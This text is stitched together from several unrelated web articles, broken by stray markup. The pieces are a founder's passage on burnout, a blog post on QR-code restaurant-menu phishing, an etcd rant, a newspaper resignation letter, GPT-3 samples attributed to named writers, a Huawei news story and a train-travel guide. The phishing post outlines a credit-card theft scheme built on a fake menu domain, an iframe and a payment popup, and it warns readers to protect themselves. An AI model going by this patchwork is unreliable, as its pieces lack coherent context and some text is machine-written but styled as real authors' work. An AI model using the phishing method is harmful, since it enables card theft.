<p>This is not that bad of a strategy! But it’s not exactly specific.</p>
<p>I didn’t really ask myself: What is my overall business going to look like? How will I get there? I started with services, because I’d been consulting for a while, and I was confident I could make enough money to eat. I know investors are down on services businesses, or anything that doesn’t look like a founder throwing themselves off a cliff with what they hope is a parachute. But you gotta eat. And services are a fantastic way to make money while you’re figuring things out.</p>
<p>I had a lot to figure out.</p>
<p>At the time — 2005 — there were a lot of open source companies out there. When I say a lot, there were four. I thought, “They’re doing well, I will copy one of them at some point later on.” That was not that great of a plan. Two years later Red Hat was the only one left. They’re a software powerhouse today, but they went public during the bubble as a T-shirt and mug company. There’s no copying that.</p>
<p>I did start making money, though. We consulted for three-and-a-half years. “We.” I was the only employee. About three years into the company, I discovered one day that I was incredibly burned out. This was the first of three major burnouts for me at Puppet.</p>
<h2>Burnout Strikes</h2>
<p>I distinctly remember realizing I was burned out. I was standing next to my wife, at the doctor’s office, looking at an ultrasound. We just learned we’re going to have twins, and I get a sudden flash of insight: My life is unsustainable.</p>
<p>I personally can’t recommend, when you’re in a bootstrapped startup, planning to have a baby. I would work especially hard to avoid having more than one at a time. But that’s what we did.</p>
<p>(Speaking of which: All you people who had your babies serially, you’re lazy and you don’t know what you’re doing. You think you had it hard. We were tested. Y’all are amateurs.)</p>
<p>The technician said, “Oh, you are going to get scanned a lot.” Um. You’re going to have to explain that one. She told us we were having two. We laughed. She must be incompetent. Just because <em>you</em> have twins (she did) doesn’t mean you can recognize them in someone else. While using an ultrasound wand. Which is your job. Scan… scan… BING! The two fetuses clearly popped into view. My wife would have fallen over if she weren’t already lying down. My knees shook. I thought, I can’t do this anymore.</p>
<p>I had been working every hour I could. I counted once: It was about 72 hours in my busiest week. There are people who say, I work 100 hours a week. You might stand there 100 hours a week. I’m skeptical you’re working. Based on <a href="https://cs.stanford.edu/people/eroberts/cs201/projects/crunchmode/econ-hours-productivity.html">what I know about productivity</a>, I hope you’re not.</p>
<p>I couldn’t do it anymore. Since February 2008 or so, coincidentally the same day I found out we were having twins, I haven’t worked more than 40 or 50 hours a week. No evenings and weekends. I might dabble sometimes, but I won’t let it become a pattern.</p>
<p>Don’t worry. I managed to burn myself out two more times without those extra hours. It can still be just as bad. Pack that intensity into fewer hours, and you’re all good.</p>
<p>So. I need help. How?</p>
<h2>Getting Help</h2>
<p>I had tried to hire people in the past. Both of them were misses.</p>
<p>The first hire was the most notable. In the three months it took to figure out he wouldn’t work out, the best person I could possibly have hired became available and then unavailable. This guy’s biggest impact was ensuring I couldn’t hire the person who would have been most helpful.</p>
<p>There’s one more crazy story about him. In the middle of his interview at my house there was a drive-by shooting next door. He had taken a bathroom break when the shooting happened. They weren’t trying to hurt anybody, just shooting up a car to send a message. One of the bullets ricocheted off the car, then my porch, and broke my front window. He came out of my bathroom, and I said, “Are you ok?”<br>
“Yeah, why?”<br>
“No reason.”</p>
<p>I needed him to work in my house.</p>
<p>(Yes, I did actually tell him. Eventually.)</p>
<p>When he didn’t pan out, I concluded, I guess I just can’t hire. I’ll do it all myself.</p>
<p>Pro tip: Don’t do that.</p>
<p>Puppet worked in spite of these decisions, not because of them.</p>
<p>Things had changed, quite suddenly. I needed help, and now.</p>
<p>I hired the only people I could think of who might do me a favor: my college roommate and my best friend. Two separate people. Again: Don’t do this. I paid them full salaries.</p>
<p>Years later, I realized, “Wait a minute, if I was paying them full salary, they weren’t really doing me a favor, were they?”</p>
<p>Burned-out people make low-quality decisions. Your brain is gone, and you’re stupid. You work too many hours, you get burned out. You hurt your business doing this kind of thing. Get sleep, eat well, get exercise, step away …</p></div></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p><img src="https://images.unsplash.com/photo-1572798793834-67d5e285760d?ixlib=rb-1.2.1&amp;q=85&amp;fm=jpg&amp;crop=entropy&amp;cs=srgb&amp;ixid=eyJhcHBfaWQiOjYzOTIxfQ&amp;w=3600" alt="credit card at a restaurant">
A few days ago, a friend (lets call her Eli) told me about how someone stole her credit card info at a restaurant.</p>
<p>We’re in Chicago in the middle of the Covid-19 pandemic. Restaurants have started to open back up, but only those with outdoor seating. To avoid spreading Covid, some restaurants are placing a laminated piece of paper with a QR code on each table.</p>
<p>This QR code links to a menu on the restaurant’s website. What a great idea! Restaurants don’t need to hand out menus, in fact they don’t even have to print them anymore! They can update the menu in realtime as things go out of stock or the selection changes.</p>
<p>When Eli sat down at this restaurant in Chicago, she used the QR code to open up the menu and browsed around for a bit. After a few minutes, a pop-up asked her to enter her credit card info for a seamless checkout.</p>
<p>Hmm. This is where alarm bells might go off, but remember - we’re in the middle of a pandemic. Passing credit cards to a server is dangerous! What if they have covid? What if <em>you</em> have Covid and you infect your server? It would be best to have everything be contactless. Eli entered her card info, thinking that this was actually a pretty good user experience.</p>
<p>As you may have guessed by now, it wasn’t the restaurant collecting her credit card info. Someone placed a fake menu on the table with a QR code pointing to their own phishing site. This seems pretty easy to do. Someone could walk by and place fake menus on a few tables.</p>
<p>On the tech side, things are even easier. The attacker can register a generic sounding domain, eg. lookatmenu.app. Next, they create a unique QR code for each target restaurant. You don’t even need a separate domain for each restaurant. Just add the restaurant’s actual menu URL as a query parameter. Eg: <a href="https://lookatmenu.app/?s=%5Bhttps://orders.giordanos.com/#/menu/national/ToGo/Pickup%5D(https://orders.giordanos.com/#/menu/national/ToGo/Pickup)">https://lookatmenu.app?s=https://orders.giordanos.com/#/menu/national/ToGo/Pickup</a></p>
<p>You can pass this query string into an iFrame, which makes it look like you’re actually on <a href="http://giordanos.com/">giordanos.com</a>. After a few seconds, simply show a popup to a payment form of your choosing.</p>
<p>In Eli’s case, the credit card was charged to some sort of nondescript subscription service. If it’s something with a generic name for a $20/month or so, a lot of people might not notice for a long time.</p>
<p><a href="https://codepen.io/pranas/pen/rNxZMMy">Here’s a codepen with example code</a>.</p>
<h2><strong>So, how do I protect myself?</strong></h2>
<ol>
<li>Always look at the URL of the page when entering credit card info. If anything seems off, don’t enter your payment info.</li>
<li>Be sure to ask the server if the menu is legit.</li>
</ol>
<p>Although I hate to hear stories like this, it’s always interesting to see how fraudsters exploit technology and our trust. Luckily, my friend’s credit card company refunded the charges and issued a new card.</p>
<p>Stay safe out there!</p></section></div>]]>

		<div><p><img alt="etcd icon" src="https://www.roguelazer.com/images/etcd-icon.png"></p>
<p>Once upon a time in 2013, there was a tool called <a href="https://etcd.io/">etcd</a> which was a really lightweight database written
around the <a href="https://web.stanford.edu/~ouster/cgi-bin/papers/raft-atc14">Raft</a> consensus algorithm. This tool was
originally written in 2013 for a <del>bullshit</del> unsuccessful project called <a href="https://coreos.com/os/docs/latest/">CoreOS Container Linux</a> that was
EOL'd several years ago, but that doesn't really matter — etcd was greater than its original use-case. Etcd
provided a convenient and simple set of primitives (set a key, get a key, set-only-if-unchanged, watch-for-changes) with
a drop-dead simple HTTP API on top of them. I have built a number of tools using etcd as a lightweight consensus store
behind them and it's absolutely a pleasure to work with.</p>
<div>
<p>Hello <strong>massive influx of new readers</strong>! I see that some <del>person who's out to get me</del> kind soul has
cross-posted this to Hacker News, Reddit, and a bunch of other sites. Cool! A few things you might want to know <em>before</em>
you send me hate-mail:</p>
<ul>
<li>The word "rant" is right up there in the tags line. This is not meant to be a persuasive argument to the secret cabal
  that controls API design or a nuanced technical comparison article. It's just some off-the-cuff thoughts. Chillax.</li>
<li>If this didn't come across clearly enough in the article: <em>I think etcd is great!</em> I have written a bunch of tools and
  applications on top of it! I think it's a fantastic little dæmon and its API, even the new janky v3 API, is still a
  million times better than ZooKeeper</li>
</ul>
<p>Okay, then. Read on.</p>
</div>
<p>In 2015, an unrelated tool called <a href="https://github.com/kubernetes/kubernetes">Kubernetes</a> was released by Google (but, really, by
Xooglers). I would go so far as to say that Kubernetes (or, as the "cool kids" say, <kbd>k8s</kbd>) is the worst thing to happen to system administration
since <a href="https://www.roguelazer.com/2020/03/systemd/">systemd</a>. It's a comprehensive suite that promises to simplify operating clusters of software and give something like 
the experience of Google's <kbd>borg</kbd> cluster manager. What it really does is:</p>
<ol>
<li>Add hundreds of new failure modes to your software</li>
<li>Move you from writing portable software configuration to writing thousands of lines of k8s-specific YAML</li>
<li>Ensnare you in a mesh of questionably-good<sup id="fnref:questionably-good"><a href="#fn:questionably-good">1</a></sup> patterns like containerization and software defined networking</li>
</ol>
<p>If you are running a truly enormous system and want to have off-the-shelf orchestration for it, Kubernetes may be
the tool for you. For 99.9% of people out there, it's just an extra layer of complexity that adds almost nothing of
value.</p>
<p>I digress, though; this is a story about etcd. And, unfortunately, our stories come together because Kubernetes was
quickly changed to use etcd as its state store. Thus began the rapid decline of etcd.</p>
<p>With the massive influx of Kubernetes users came, of course, a large number of Xooglers who decided to infect etcd with
Google technologies, as is their way<sup id="fnref:infection"><a href="#fn:infection">2</a></sup><sup id="fnref:who"><a href="#fn:who">3</a></sup>. Etcd's simple HTTP API was replaced by a "gRPC"<sup id="fnref:grpc"><a href="#fn:grpc">4</a></sup> version; the
simple internal data model was replaced by a dense and non-orthogonal data model with different types for leases, locks,
transactions, and plain-old-keys. etcd 3.2 added back a tiny subset of the HTTP API through the <a href="https://etcd.io/docs/v3.4.0/dev-guide/api_grpc_gateway/">"gRPC
Gateway"</a>, but not enough to implement
any of the rich applications built on top of the original API. The v2 API lives on for now, but upstream threatens to
remove it in every new version and there will surely come a time when it'll be removed entirely.</p>
<p>That's it. That's the story. Popular modern technology is taken over by expats from a megacorp and made worse in the
service of a hyper-specialized (and just plain over-hyped) orchestration platform. That's the world today. Anything that
has a simple and elegant feature-set ends up coöpted by people who just want to build big ungainly architecture and ends
up inheriting features from whatever megacorp the coöpters came from<sup id="fnref:megacorp"><a href="#fn:megacorp">9</a></sup>. The software development world would
prefer to use their multi-gigabyte IDEs running on ElectronJS to build thousand-dependency Java applications targeting
ungainly APIs on hard-to-operate systems than support something simpler and better. Quality is, alas, a dying art.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-block-type="2" id="block-5f0dca0caa6bc4150907a76b"><div><p>Dear A.G.,</p><p>It is with sadness that I write to tell you that I am resigning from The New York Times.&nbsp;</p><p>I joined the paper with gratitude and optimism three years ago. I was hired with the goal of bringing in voices that would not otherwise appear in your pages: first-time writers, centrists, conservatives and others who would not naturally think of The Times as their home. The reason for this effort was clear: The paper’s failure to anticipate the outcome of the 2016 election meant that it didn’t have a firm grasp of the country it covers. Dean Baquet and others have admitted as much on various occasions. The priority in Opinion was to help redress that critical shortcoming.</p><p>I was honored to be part of that effort, led by James Bennet. I am proud of my work as a writer and as an editor. Among those I helped bring to our pages: the Venezuelan dissident Wuilly Arteaga; the Iranian chess champion Dorsa Derakhshani; and the Hong Kong Christian democrat Derek Lam. Also: Ayaan Hirsi Ali, Masih Alinejad, Zaina Arafat, Elna Baker, Rachael Denhollander, Matti Friedman, Nick Gillespie, Heather Heying, Randall Kennedy, Julius Krein, Monica Lewinsky, Glenn Loury, Jesse Singal, Ali Soufan, Chloe Valdary, Thomas Chatterton Williams, Wesley Yang, and many others.</p><p>But the lessons that ought to have followed the election—lessons about the importance of understanding other Americans, the necessity of resisting tribalism, and the centrality of the free exchange of ideas to a democratic society—have not been learned. Instead, a new consensus has emerged in the press, but perhaps especially at this paper: that truth isn’t a process of collective discovery, but an orthodoxy already known to an enlightened few whose job is to inform everyone else.</p><p>Twitter is not on the masthead of The New York Times. But Twitter has become its ultimate editor. As the ethics and mores of that platform have become those of the paper, the paper itself has increasingly become a kind of performance space. Stories are chosen and told in a way to satisfy the narrowest of audiences, rather than to allow a curious public to read about the world and then draw their own conclusions.<strong> </strong>I was always taught that journalists were charged with writing the first rough draft of history. Now, history itself is one more ephemeral thing molded to fit the needs of a predetermined narrative.</p><p>My own forays into Wrongthink have made me the subject of constant bullying by colleagues who disagree with my views. They have called me a Nazi and a racist; I have learned to brush off comments about how I’m “writing about the Jews again.” Several colleagues perceived to be friendly with me were badgered by coworkers. My work and my character are openly demeaned on company-wide Slack channels where masthead editors regularly weigh in. There, some coworkers insist I need to be rooted out if this company is to be a truly “inclusive” one, while others post ax emojis next to my name. Still other New York Times employees publicly smear me as a liar and a bigot on Twitter with no fear that harassing me will be met with appropriate action. They never are.</p><p>There are terms for all of this: unlawful discrimination, hostile work environment, and constructive discharge. I’m no legal expert. But I know that this is wrong.&nbsp;</p><p>I do not understand how you have allowed this kind of behavior to go on inside your company in full view of the paper’s entire staff and the public. And I certainly can’t square how you and other Times leaders have stood by while simultaneously praising me in private for my courage. Showing up for work as a centrist at an American newspaper should not require bravery.</p><p>Part of me wishes I could say that my experience was unique. But the truth is that intellectual curiosity—let alone risk-taking—is now a liability at The Times. Why edit something challenging to our readers, or write something bold only to go through the numbing process of making it ideologically kosher, when we can assure ourselves of job security (and clicks) by publishing our 4000th op-ed arguing that Donald Trump is a unique danger to the country and the world? And so self-censorship has become the norm.</p><p>What rules that remain at The Times are applied with extreme selectivity. If a person’s ideology is in keeping with the new orthodoxy, they and their work remain unscrutinized. Everyone else lives in fear of the digital thunderdome. Online venom is excused so long as it is directed at the proper targets.&nbsp;</p><p>Op-eds that would have easily been published just two years ago would now get an editor or a writer in serious trouble, if not fired. If a piece is perceived as likely to inspire backlash internally or on social media, the editor or writer avoids pitching it. If she feels strongly enough to suggest it, she is quickly steered to safer ground. And if, every now and then, she succeeds in getting a piece published that does not explicitly promote progressive causes, it happens only after every line is carefully massaged, negotiated and caveated.</p><p>It took the paper two days and two jobs to say that the Tom Cotton op-ed “fell short of our standards.” We attached an editor’s note on a travel story about Jaffa shortly after it was published because it “failed to touch on important aspects of Jaffa’s makeup and its history.” But there is still none appended to Cheryl Strayed’s fawning interview with the writer Alice Walker, a proud anti-Semite who believes in lizard Illuminati.&nbsp;</p><p>The paper of record is, more and more, the record of those living in a distant galaxy, one whose concerns are profoundly removed from the lives of most people. This is a galaxy in which, to choose just a few recent examples, the Soviet space program is lauded for its “diversity”; the doxxing of teenagers in the name of justice is condoned; and the worst caste systems in human history includes the United States alongside Nazi Germany.</p><p>Even now, I am confident that most people at The Times do not hold these views. Yet they are cowed by those who do. Why? Perhaps because they believe the ultimate goal is righteous. Perhaps because they believe that they will be granted protection if they nod along as the coin of our realm—language—is degraded in service to an ever-shifting laundry list of right causes. Perhaps because there are millions of unemployed people in this country and they feel lucky to have a job in a contracting industry.&nbsp;</p><p>Or perhaps it is because they know that, nowadays, standing up for principle at the paper does not win plaudits. It puts a target on your back. Too wise to post on Slack, they write to me privately about the “new McCarthyism” that has taken root at the paper of record.</p><p>All this bodes ill, especially for independent-minded young writers and editors paying close attention to what they’ll have to do to advance in their careers. Rule One: Speak your mind at your own peril. Rule Two: Never risk commissioning a story that goes against the narrative. Rule Three: Never believe an editor or publisher who urges you to go against the grain. Eventually, the publisher will cave to the mob, the editor will get fired or reassigned, and you’ll be hung out to dry.</p><p>For these young writers and editors, there is one consolation. As places like The Times and other once-great journalistic institutions betray their standards and lose sight of their principles, Americans still hunger for news that is accurate, opinions that are vital, and debate that is sincere. I hear from these people every day. “An independent press is not a liberal ideal or a progressive ideal or a democratic ideal. It’s an American ideal,” you said a few years ago. I couldn’t agree more. America is a great country that deserves a great newspaper.&nbsp;</p><p>None of this means that some of the most talented journalists in the world don’t still labor for this newspaper. They do, which is what makes the illiberal environment especially heartbreaking. I will be, as ever, a dedicated reader of their work. But I can no longer do the work that you brought me here to do—the work that Adolph Ochs described in that famous 1896 statement: “to make of the columns of The New York Times a forum for the consideration of all questions of public importance, and to that end to invite intelligent discussion from all shades of opinion.”</p><p>Ochs’s idea is one of the best I’ve encountered. And I’ve always comforted myself with the notion that the best ideas win out. But ideas cannot win on their own. They need a voice. They need a hearing. Above all, they must be backed by people willing to live by them.&nbsp;</p><p>Sincerely,</p><p>Bari </p></div></div></div></div>]]>

<p>I got access the the <a href="https://openai.com/blog/openai-api/">OpenAI GPT-3 API</a> and I have to say I’m blown away. It’s far more coherent than any AI language system I’ve ever tried. All you have to do is write a prompt and it’ll add text it thinks would plausibly follow. I’ve gotten it to write songs, stories, press releases, guitar tabs, interviews, essays, technical manuals. It’s hilarious and frightening. I feel like I’ve seen the future and that full AGI might not be too far away.</p>



<p>In each case below bold is the prompt I provided GPT-3, and the rest is all generated by the AI. In some cases I had to click generate a few times, and in about 2/3 of the examples I picked the best example after a few tries, but I generally didn’t have work too hard to get it to write amazingly coherent text given a simple prompts. Here are some of my favorites. </p>

<p><strong>Below is a screenplay for a film-noir hard boiled detective story by Raymond Chandler about the boy wizard Harry Potter:</strong></p>



<p><strong>“Harry Potter”</strong><br><strong>By Raymond Chandler</strong></p>



<p>Harry Potter, Private Eye.<br>Scene: A small dingy office, early morning, furniture of the Salvation Army store variety. Sordid atmosphere. Harry Potter, in ratty tweed suit, unpressed shirt, and unshined shoes, sits behind the desk looking haggard, rumpled, and embittered. In one corner of the office a torn shade rattles at the wind gusts outside. Harry has one long index finger on the butt of a .38 and he broods over a photograph. The photograph shows a gorgeous blonde wearing an evening gown. She is holding a cocktail in one hand and looking pensively at a cigarette in the other. A tear adorns her cheek. Harry looks at her for a long moment, sighs, then puts his gun down and stands. He straightens his clothes, scratches his head, then with more resolution turns around, picks up his pistol, and leaves the office. He passes through the front room and looks out the dirty window. An old woman is washing the sidewalk outside with a mop. A young man in a double breasted gray suit is leaning against the building. Harry sighs again and goes out the door. He walks up to the young man and without ceremony punches him in the jaw.</p>

<p><strong>Blood Song</strong><br><strong>By HP Lovecraft</strong></p>



<p><strong>The creeping chaos Nyarlathotep walks upon the earth while in his House at R’lyeh dead Cthulhu waits dreaming. After eight seaons on&nbsp;<a rel="noreferrer noopener" target="_blank" href="https://paper.dropbox.com/?q=%23TeamDaenerys">#TeamDaenerys</a>&nbsp;&nbsp;Nyarlathotep is quite irritated with what he feels is a very hackneyed ending to Game of Thrones.</strong></p>



<p>On the third day of season eight, Nyarlathotep looks down upon his television and utters&nbsp;“What&nbsp;the hell are they doing?”At this point, Nyarlathotep goes on a long tirade about how the Starks were supposed to be there at the end. Instead we have Daenerys looking like she is going to set everything on fire. He tells his cult of followers that Daenerys’ actions are completely nonsensical and that it is completely disrespectful to not finish a story with all its main characters alive. He mentions that they should just burn down Winterfell because it makes no sense for her to even be there. It would make more sense if she flew in with Drogon and just burned King’s Landing. His followers start to get nervous when Nyarlathotep mentions he has always liked Cersei.</p>

<p>Harry’s got glasses <br>He’s got those bright green eyes <br>Girls are always screaming </p>



<p>‘Cause he’s got that Potter hair </p>



<p>Even when he’s super stressed <br>He’s still got those supersonic cheekbones <br>I’m not surprised they made a movie </p>



<p>‘Cause I’d watch him anytime <br>Oh, yeah, Harry, baby, you’re my favorite character </p>



<p>I’d walk a thousand miles </p>



<p>To get to see you and </p>

<p>I’d love to be your girl </p>



<p><strong>The following is an essay by Paul Graham on paulgraham.com on how to make Mars a startup hub</strong>.</p>



<p><strong>Startups On Mar</strong>s<br><strong>By Paul Graham</strong></p>



<p>Here’s the sort of startup that might make a go of it on Mars:<br>One that makes money by taking advantage of local resources. For example, a startup that uses the Martian atmosphere to make fertilizer or methane fuel. A startup that sells water from Martian rivers. A startup that uses minerals from the Martian soil. A startup that uses solar power from the Martian sun. A startup that uses a new kind of solar panel that’s more efficient at converting sunlight into electricity.<br>I would even invest in a startup that did nothing but extract the helium-3 from the Martian atmosphere and send it back to Earth.<br>If you can find a way to make money by using local resources, there’s probably a business there.<br>There’s another class of startups that might work on Mars:<br>Startups that produce services for other startups. For example, a startup that makes it easier to build rockets, or to extract gases from the Martian atmosphere, or to construct solar panels, or to farm the local soil.<br>Startups that make things more comfortable for colonists. For example, a startup that sells air conditioners, or houses. A startup that sells things to keep colonists entertained. A startup that provides Internet services.</p>



<p><strong>The following is a blog post from Slate Star Codex about the value of free speech and civility in a democratic society.</strong></p>



<p><strong>Do Not Go Gentle Into That Good Night</strong><br><strong>By Scott Alexander</strong></p>



<p>I.<br>There’s a concept that comes up often in debates about free speech called&nbsp;“shouting&nbsp;fire in a crowded theater”. The basic idea is that you can’t just say whatever you want whenever you want – especially if it’s likely to cause panic. And the reason for this is obvious: panic leads to violence, and violence hurts people. If you are causing panic, then your right to free speech ends where the other person’s right to not get hurt begins.<br>But this isn’t really true. If shouting fire in a crowded theater were illegal, then there wouldn’t be any actual fires in theaters, would there? How could there be? If everyone knew that shouting fire …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><article><p><time datetime="2020-07-14T11:46:39">July 14, 2020</time> by <a href="https://www.theverge.com/2020/7/14/21322880/uk-bans-huawei-5g-network-infrastructure-trump-administration-pressure">The Verge</a> | <a href="https://newsworthy.to/category/opinion">Opinion</a></p><p>After allowing it a limited role in January</p><p>Huawei’s networking equipment is to be phased out of the UK’s 5G networks, the <a href="https://www.gov.uk/government/news/huawei-to-be-removed-from-uk-5g-networks-by-2027">government announced today</a>. Telecoms operators will not be allowed to buy new 5G telecoms equipment from the Chinese firm from January next year, and they will have seven years to remove its existing technology from their 5G infrastructure at an expected cost of £2 billion. The announcement follows a new report about Huawei’s role in the UK’s national infrastructure from the UK’s National Cyber Security Centre.</p><p>The decision marks a U-turn from the government’s previous position, <a href="https://www.theverge.com/2020/1/28/21083762/huawei-5g-network-infrastructure-uk-national-security">announced in January</a>, which allowed Huawei’s equipment to be used in the country’s 5G infrastructure, with certain limitations. Under that position, Huawei would be limited to a 35 percent market share, and its equipment couldn’t be used in core parts of the network or geographically sensitive locations. Now, however, its equipment will be completely removed from the country’s 5G networks. </p><p>The UK’s Digital, Culture, Media, and Sport Secretary Oliver Dowden warned that the decision “will delay our rollout of 5G.” As part of the announcement, the government said that it is also advising full fiber broadband operators to transition away from buying Huawei’s equipment.</p><p>In recent months, the British government has seen mounting pressure, both domestically and internationally, to phase out the use of Huawei’s equipment entirely. That pressure has been driven by concern from security experts that <a href="https://www.theverge.com/2019/3/17/18264283/huawei-security-threat-experts-china-spying-5g">Huawei’s equipment poses a national security risk</a> by allowing Beijing to spy on Western countries. Huawei has <a href="https://www.bbc.co.uk/news/business-47279262">strenuously denied these allegations</a>.</p><p>International pressure has mainly come from the US. Huawei has been on the country’s “entity list” since <a href="https://www.theverge.com/2019/5/15/18216988/white-house-huawei-china-equipment-ban-trump-executive-order">May 2019</a>, meaning US companies cannot sell technology to the company. However, in May this year, <a href="https://www.nytimes.com/2020/05/15/business/economy/commerce-department-huawei.html"><em>The New York Times</em> reported</a> the US toughened its stance with the announcement of new sanctions against Huawei. Under the new measures, which are due to go into effect in September, Huawei and its suppliers, like chip manufacturer TSMC, cannot use American tech to design or produce Huawei’s products. At the time, US officials characterized the move as “closing a loophole” through which Huawei could effectively have previously used American technology.</p><p>These new measures could have a big impact on the products Huawei is able to produce, which critics argue could make its equipment less safe to use. The restrictions “will force the company to use untrusted technology that could increase the risk to the UK,” according to a <a href="https://www.theverge.com/2020/7/6/21314340/huawei-5g-networks-security-risk-us-uk">security report that leaked earlier this month</a>.</p><p>For example, Huawei’s own HiSilicon chipsets could be impacted by the measures. <a href="https://www.bbc.co.uk/news/technology-53179963"><em>BBC News</em> reports</a> that the semiconductor industry relies on electronic design automation (EDA) software to automate the process of designing modern chips like Huawei’s Kirin 990 5G processor. However, the sanctions mean that this software can no longer be used in the design or production of Huawei’s chips since the major EDA developers have ties to the US. It makes it difficult for Huawei to produce its own modern top-of-the-line processors, <a href="https://www.bbc.co.uk/news/technology-53341080">according to <em>BBC News</em></a><em>, </em>pushing it towards third-party chips that, it’s argued, could be harder for UK cybersecurity officials to vet.</p><p>Meanwhile, UK Prime Minister Boris Johnson is also facing pressure from inside his own party. The government suffered the biggest defeat of its current term back in March, when <a href="https://www.bbc.co.uk/news/uk-politics-51806704"><em>BBC News</em> reports</a> 38 Conservative MPs voted against the government in favor of an amendment calling for an end to the use of Huawei equipment in the country’s 5G networks by 2023. Increasing numbers of Conservative MPs claim that the equipment poses a national security risk, potentially allowing Beijing to spy on the UK, <a href="https://www.ft.com/content/e4b7f816-00cc-4dc5-bb97-4e761200022a">according to the<em> Financial Times</em></a>. Although the government won the vote, the incident put pressure on Johnson to take a tougher stance.</p><p>Responding to the news, a spokesperson from Huawei called the decision “disappointing” and said that the company is “confident” the new US sanctions wouldn’t affect “the resilience or security of the products we supply to the UK.” It claimed that they were driven by US trade policy rather than security and urged the British government to reconsider its decision.</p><p>News of a possible ban has proved unpopular with telecom firms, many of which have already started using Huawei’s equipment to <a href="https://www.theguardian.com/technology/2019/jul/06/huawei-uk-mobile-5g-networks-operators-gamble-security-concerns">build out their 5G networks</a>. In comments <a href="https://www.theguardian.com/technology/2020/jul/13/bt-boss-warns-of-outages-and-security-risks-if-uk-ditches-huawei">later published in <em>The Guardian</em></a>, BT chief executive Philip Jansen told BBC Radio 4’s Today program that it would be “impossible” to remove Huawei entirely from the country’s telecoms infrastructure in the next decade and that it would take five to seven years to remove it from the 5G network. Jansen warned that forcing the removal of Huawei’s equipment too quickly could create outages and security risks of its own.</p><p><em><strong>Update July 14th, 8:13AM ET:</strong></em><em> Updated with response from Huawei and more details from government press release. </em></p></article></div></div></div>]]>

<p>Many writers wax lyrical about the romance of long-distance train travel, but on this trip I sampled four them — Irkutsk to Ulaanbaatar, Ulaanbaatar to Beijing, Beijing to Xi’an, and Xining to Lhasa — and the sad truth is that the passenger trains in these parts are strictly utilitarian workhorses, inferior to airplanes on virtually every measure of speed or comfort.&nbsp; &nbsp;Here’s the lowdown on life in a 4-berth sleeper (<em>kupé</em> in Russia, 软卧 <em>ruǎnwò&nbsp;</em>in China).</p>
<h2>Eat</h2>

<p>When you’re on a train for 24 hours or more, you’ve got to eat something, and this leaves you with three options.</p>
<p>The first and most obvious option is <strong>restaurant cars</strong>, and the Mongolian ones with their intricate wood carvings and embroidered tablecloths even look quite attractive.&nbsp; Alas, the food they serve ranges&nbsp;from bland but edible, like our Chinese breakfast set composed mostly of sausage, celery and chilli, to bland and near-inedible, such as the&nbsp;<em>incredibly&nbsp;</em>gristly beef served on the Mongolian train — I was picking bits out of my teeth for the next two days.&nbsp; Perhaps we should have taken the hint from the plastic bags of frozen beef sitting in the corridor, tenderizing in the midsummer heat of the Gobi Desert.</p>
<p>Alternatively, you can try to buy food on <strong>station platforms</strong>, but this presents a number of practical problems.&nbsp; First, stops are few and far between and rarely aligned with mealtimes.&nbsp; Second, stops are short and on arrival you neither have any idea what the options are nor where to find them.&nbsp; Third, if you do find something food-like, it’s often unclear how many days those mince-meat&nbsp;<em>khuushuurs</em>&nbsp;sitting on a table&nbsp;have been fermenting under the Mongolian sun.&nbsp; We did manage to swing some pretty decent&nbsp;<em>piroshki </em>pastries&nbsp;in Ulan-Ude, plus rye bread and boiled eggs in Mongolia, but it really is the luck of the draw and you can’t count on finding more than packaged snacks this way.</p>

<p>Finally, you can <strong>bring your own food</strong>, but with no refrigeration or heating available (aside from hot water), you’ll be hard pressed to expand your culinary horizons beyond packaged bread, instant noodles and the giant Russian rye croutons called&nbsp;<a href="http://snackproduction.com.ua/grenki-3/"><em>grenki</em></a>.&nbsp; (Best flavor: garlic with garlic dip.&nbsp; You’re welcome.)&nbsp; A useful compromise is to buy a meal at your&nbsp;<em>departure&nbsp;</em>station: you’re not going to find much more than fast food, but even KFC is likely tastier, cheaper and healthier than the alternatives.</p>
<p>All that said, you <em>can</em> generally rely on the restaurant cars to supply lukewarm beer at only mildly extortionate prices, which brings me to…</p>
<h2>Drink</h2>

<p>Russian and Mongolian trains forbid drinking <strong>alcoholic beverages</strong> on board; fortunately, this being Russia and Mongolia, beer is not considered alcohol.&nbsp; (Seriously.)&nbsp; Needless to say, this rule is widely ignored by all and sundry, although it’s generally wise to close your compartment door if you have one and avoid tippling at times when conductors are on the prowl.</p>
<p>The one free drink provided in abundant quantities is <strong>boiling hot water</strong>, supplied by a coal or wood fired boiler at the end of each carriage.&nbsp; If you’re lucky, there may even be a thermos bottle in your cabin, which you can use to stock your own supply.&nbsp; Bring along some teabags, instant coffee or cocoa, and you can stay caffeinated.&nbsp; A&nbsp;pedantic nit: most travelers call these <a href="https://en.wikipedia.org/wiki/Samovar">samovars</a>, but in Russian they’re actually “titans” (титан).</p>
<p>Non-hot water, on the other hand, is in distinctly short supply, as the water from the bathroom taps is <strong>not drinkable</strong>.&nbsp; Bring along more than you think you will need, particularly if it’s hot or high outside.&nbsp; As for taking a shower or a bath, forget about it.</p>
<h2>Poop</h2>
<p>Yes, this section has no pictures.&nbsp; (You’re welcome.)</p>
<p>The upside to strictly functional trains is that their toilets are also unencumbered with pneumatic vacuums and mysterious blue liquids.&nbsp; Instead, when you press the lever, the bottom opens up and the contents are deposited straight onto the tracks, followed by a slightly apologetic trickle of water.&nbsp; While this does an admirable job of preventing the toilet from clogging, it does also mean that the doors are locked while the train is stationary, including during those multi-hour border crossings.</p>
<p>On Chinese trains, you will also encounter squat toilets, although there are usually a few thrones to be found as well.&nbsp; The upside to these is that, no matter how filthy the rest of the room, only your feet need make contact; the downside is that whatever your feet make contact with is likely to be unpleasant.&nbsp; This is why everybody on board brings flip-flops to wear.&nbsp; &nbsp;And whether your train is Russian, Mongolian or Chinese, you’ll want to bring toilet paper and soap as well.</p>
<h2>Sleep</h2>
<p>Fed, hydrated and voided, it’s time to sleep.&nbsp;&nbsp;The uninitiated are often tempted by the idea of a hotel on wheels: just slumber away peacefully on board and you’ll arrive at your destination not just refreshed, but having saved on a night’s hotel bill!&nbsp; Reality is more complicated.</p>

